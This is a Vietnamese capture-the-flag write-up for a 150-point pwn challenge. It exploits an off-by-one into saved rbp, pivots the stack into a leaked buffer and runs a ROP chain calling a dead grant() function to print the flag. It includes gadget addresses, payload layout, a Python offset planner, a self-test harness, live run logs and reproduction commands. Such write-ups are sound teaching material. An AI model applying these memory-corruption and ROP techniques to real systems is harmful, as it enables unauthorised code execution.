# Maintenance Log - Pwn (150 điểm)

**Cờ:** `CSSCTF{Duh_m4t3_1_4m_sl33py}` · **File cho trước:** `chall` (14480 B, sha256
`de630ba8…b118e3`), `Dockerfile`, `flag.txt` · **Dịch vụ:** `nc 34.116.80.78 7312`

## Đề bài

Một terminal bảo trì in ra banner rồi hỏi hai câu: summary của báo cáo và tên người
tag. Vendor khẳng định service "được gia cố bằng stack canary nên an toàn trước lỗi
memory corruption", nhưng chính giao diện lại in ra một địa chỉ (`IS LEAKING`). Mục
tiêu là lấy được "administrative clearance", tức gọi vào đoạn code cấp quyền để nó in
nội dung `flag.txt` trên server.

## Phân tích ban đầu

`chall` là ELF 64-bit `Type: EXEC`, tức no-PIE: mọi địa chỉ code cố định, nên ROP
không cần leak code. NX bật, RELRO một phần, binary stripped. Trong `.text` chỉ có
các vùng code đáng đọc (hai dòng `0x40124d`/`0x40124f` không phải hàm, chúng là gadget
lọt vào do compiler chèn padding giữa các hàm):

| Địa chỉ | Vai trò | Canary |
| --- | --- | --- |
| `0x4011b6` | `io_setup()`: `setvbuf(stdin/stdout/stderr, _IONBF)` | có |
| `0x401268` | `grant(int, int)` - **code chết**, không ai gọi | có |
| `0x40124d` | `pop rdi; ret` (nằm ở padding giữa các hàm) | |
| `0x40124f` | `pop rsi; ret` | |
| `0x401348` | `operator()` | không |
| `0x40139a` | `report()` | không |

`grant(edi, esi)` so `edi == 0xdeadbeef` và `esi == 0xcafebabe`; khớp thì
`fopen("flag.txt")`, `fgets`, `puts` rồi `exit(0)`, không khớp thì in `[-] Authentication
token mismatch.`. Đây chính là "perimeter" phải vượt qua, và `grant` được chọn làm
đích vì nó là hàm duy nhất đọc `flag.txt`.

Hai hàm ta tương tác thật thì lại không có canary: lời khoe của vendor chỉ đúng với
`io_setup`/`grant`/`main`, mà `main` thì không kịp quay về check vì `grant` gọi `exit`.
Đáng chú ý hơn, `report()` in địa chỉ buffer của nó:

```
0x4013b8: lea rax,[rbp-0x50]; mov rsi,rax
0x4013bf: lea rax,[rip+0xcd2]   # "[*] Report buffer allocated at: %p"
```

đó là cái leak mà đề nhắc. Cuối cùng, `report()` gọi `read(0, rbp-0x50, 0x50)` - đọc
đúng bằng kích thước buffer nên không tràn, nhưng rồi gọi `operator()`, và hàm này làm:

```
0x401350: memset(rbp-0x20, 0, 0x20)
0x40137a: mov QWORD PTR [rbp-0x28], 0x21
0x401392: read(0, rbp-0x20, 0x21)     # 33 byte cho buffer 32 byte
```

Off-by-one. Byte thứ 33 rơi đúng vào slot saved rbp.

## Các hướng đã loại trừ

1. **Tràn buffer `report()` đè return address.** Buffer phủ `X-0x70..X-0x21` (với
   `X = rbp_main`), còn return address nằm ở `X-0x18`, tức vượt quá tầm viết đúng 8
   byte. Loại.
2. **Vô hiệu hóa canary.** `report()` và `operator()` không hề có canary, nên không có
   gì để vượt. Loại - đây là chi tiết đánh lạc hướng của đề.
3. **Pivot ngay trong `operator()**. Mô hình đầu của tôi cho rằng `rbp_op = X-0x70` nên
   `leave; ret` của `operator()` sẽ `ret` vào qword đầu buffer `report()`. Sai chỗ
   `push rbp` của `operator()` ghi xuống `X-0x80` chứ không phải `X-0x70`: `ret` của nó
   pop đúng cái return address `0x401407` mà `call operator()` vừa push, nên control
   quay về `report()` bình thường. Loại; toàn bộ lời giải sau này dựa trên epilogue của
   `report()`, và mô hình sai kia đã bị chính con harness bắt (xem Bước 4).

## Chuỗi khai thác

**Bước 1 - Dựng sơ đồ stack.** Với `X = rbp_main`, theo đúng thứ tự prologue/epilogue:

```
X-0xA0 .. X-0x81 : buffer 32 byte của operator()   (nội dung ta chọn)
X-0x80           : slot saved rbp của operator(), giá trị X-0x20  <- byte thấp bị off-by-one đè
X-0x78           : return address vào report() (0x401407), ta không ghi tới
X-0x70 .. X-0x21 : buffer 80 byte của report()     (nội dung ta chọn, P = X-0x70)
X-0x20           : slot saved rbp của report(), giá trị X
X-0x18           : return address vào main (0x401453)
```

**Bước 2 - Đọc ra primitive từ 1 byte.** `operator()` kết thúc, `report()` in
`[*] Processing report...` rồi tới `leave; ret` của chính nó. Lúc này `rbp_report` đã
bị sửa thành `(X-0x20) & ~0xFF | z`, với `z` là byte thứ 33 ta gửi. Do đó:

```
leave      ->  rsp = B + z          (B = (X-0x20) & ~0xFF, 8 byte cao bất biến)
pop rbp    ->  rsp = B + z + 8
ret        ->  rip = qword[B + z + 8]
```

Ta chọn `z` tự do trong 256 giá trị, nghĩa là chọn được *địa chỉ* mà `ret` lấy rip,
trong một cửa sổ 256 byte chứa quanh `X-0x20`. Mà `P` thì ta đã leak, nên `X = P + 0x70`
và `B` suy ra được - không cần leak nào khác. Cửa sổ đó phủ lên đúng 80 byte buffer
của `report()`, nơi ta đã đặt sẵn chuỗi ROP.

**Bước 3 - Điều kiện gọi được buffer.** Chuỗi cần 5 qword = 40 byte:

```
+0   pop rdi; ret (0x40124d)     +8   0xdeadbeef
+16  pop rsi; ret (0x40124f)     +24  0xcafebabe
+32  grant()      (0x401268)
```

Nếu chuỗi bắt đầu tại offset `O` trong buffer thì `A = P + O = B + z + 8`, suy ra
`z = O + L - 88` với `L = (X-0x20) & 0xFF`. Ràng buộc còn lại: `z` phải thuộc `[0, 255]`
nên cần `O >= 88 - L`; `O <= 40` để 40 byte không tràn khỏi buffer; và `O` phải là bội
của 16 để lúc vào `grant()` thì `rsp % 16 == 8` đúng theo SysV AMD64 (glibc 2.39 trong
`fopen`/`fgets` vẫn dùng lệnh SSE phụ thuộc alignment). Vì `X` luôn bội của 16 mà `L`
phụ thuộc 8 bit thấp của địa chỉ stack (ASLR), với `L ∈ {0, 16, 32, 48}` không `O` nào
thỏa - trường hợp này chỉ việc kết nối lại để lấy stack mới, ~3/4 lần là được.

```python
def plan(leak_p):
    x = leak_p + 0x70
    b = (x - 0x20) & ~0xFF
    for off in (0, 16, 32):
        z = leak_p + off - 8 - b
        if 0 <= z <= 0xFF:
            return off, z          # z la byte thu 33 gui tang cho operator()
    return None
```

**Bước 4 - Kiểm chứng offline trước khi đánh thật.** `analysis/selftest.py` là một
Fake socket + bộ nhớ phẳng mô phỏng `push rbp`/`leave`/`pop rbp`/`ret` theo đúng
disassembly, và import thẳng `plan()`/`payload()`/`attempt()` từ `exploit.py` (không
copy lại logic). Quét 16 giá trị `X mod 256`:

```
[*] thanh cong=12  plan_bo_qua=4  that_bai=0
[*] control (khong ROP): result='rip=0x4141414141414141' flag=None
[*] control (z lech 1): result='rip=0xef00000000004012'
[+] selftest OK
```

12 case ra cờ, 4 case bị `plan()` loại đúng bằng `L < 56` (harness assert điều này nên
nó không tự lừa bản thân), và control "không có ROP" lẫn "z lệch 1 byte" đều phải fail
- tức harness thật sự kiểm tra việc nhảy vào đúng qword ta muốn, chứ không phải cứ gửi
gì cũng in cờ. Chính con harness này tìm ra lỗi ở hướng loại trừ số 3: nó mô phỏng
`ret` lấy `qword[rbp]` thay vì `qword[rbp+8]` (thiếu bước `pop rbp`), cho kết quả
`rip=0` toàn bộ; sửa xong thì 12/16 case chạy được.

**Bước 5 - Đánh thật.** Một kết nối, một luồng: nhận leak, gửi 80 byte summary, gửi 33
byte tag, đọc phản hồi.

```
[*] lan thu 1/8 -> 34.116.80.78:7312
[*] P = 0x7ffdd96ba300  (P%16=0)  ->  offset=16 z=0x8 rip<-[0x7ffdd96ba310]
[*] phan hoi:
[*] Processing report...
[+] Access Granted! Here is your flag:
CSSCTF{Duh_m4t3_1_4m_sl33py}
[+] co: CSSCTF{Duh_m4t3_1_4m_sl33py}
```

Chạy lại ngay để chắc chắn không ăn may, và để xem phần tự thích ứng có hoạt động khi
địa chỉ stack đổi không:

```
[*] lan thu 1/8 -> 34.116.80.78:7312
[*] P = 0x7ffda1427b30  (P%16=0)  ->  offset=0 z=0x28 rip<-[0x7ffda1427b30]
[+] co: CSSCTF{Duh_m4t3_1_4m_sl33py}
```

Lần hai dùng `offset=0` còn lần một dùng `offset=16`, tức `plan()` đã tự chọn theo đúng
địa chỉ thật của từng phiên. Cờ nhận được khác hẳn `CSSCTF{definetely_not_flag}` trong
handout, nên đây là cờ của server chứ không phải nội dung file đi kèm.

## Cờ

```
CSSCTF{Duh_m4t3_1_4m_sl33py}
```

## Reproduce

```bash
python exploit.py                    # danh 34.116.80.78:7312, tu thich ung offset
python exploit.py <host> <port> 8    # host/port/ket noi toi da
python exploit.py --probe            # gui lien lac, chi kiem flow
python analysis/selftest.py          # kiem mo hinh frame offline
```

Cần `pwntools`. Binary no-PIE nên mọi địa chỉ gadget đã cố định; không cần leak code,
chỉ cần đúng 8 bit thấp của một địa chỉ stack mà chương trình tự in ra.
